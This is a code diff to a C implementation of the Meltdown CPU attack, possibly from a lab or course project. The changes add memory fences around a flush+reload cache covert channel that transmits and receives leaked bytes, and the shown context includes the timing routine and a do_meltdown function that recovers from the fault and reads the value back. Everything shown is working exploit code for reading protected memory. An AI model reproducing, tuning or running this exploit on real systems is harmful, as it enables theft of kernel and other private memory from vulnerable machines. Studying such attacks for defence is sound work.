@@ -49,6 +49,10 @@ static void flush(void *p) {
     asm volatile("clflush [%0]\n" : : "c"(p) : "eax");
 }
 
+static void my_mfence(){
+    asm volatile("mfence\n");
+}
+
 static inline u64 my_rdtsc() {
   u64 a = 0, d = 0;
   asm volatile("mfence;rdtscp;mfence;" : "=a"(a), "=d"(d) :: "rcx");
@@ -90,7 +94,9 @@ static void cc_setup() {
 
 // cc_transmit(uint8_t value) transmits a value through the channel
 static void cc_transmit(uint8_t value) {
+    my_mfence();
     maccess(&cc_buffer[cc_buf_offset+value*512+value]);
+    my_mfence();
 }
 
 // int cc_receive() returns the value it receives, or -1 if no value has been received
@@ -98,7 +104,7 @@ static int cc_receive() {
     u64 time;
     void *cur_adrs;
     for (int i=0; i< 256;i++){
-        asm volatile("mfence\n");
+        my_mfence();
         cur_adrs=&cc_buffer[cc_buf_offset+i*512+i];
         time = my_rdtsc();
         maccess(cur_adrs);
@@ -146,6 +152,7 @@ static int do_meltdown(uintptr_t adrs) {
     if (sigsetjmp(sig_buf, 1) == 0) {
     // call meltdown
         meltdown(adrs);
+        
         ret = cc_receive(); // receive anyways
     }else{
         ret = cc_receive(); // receive if segfault
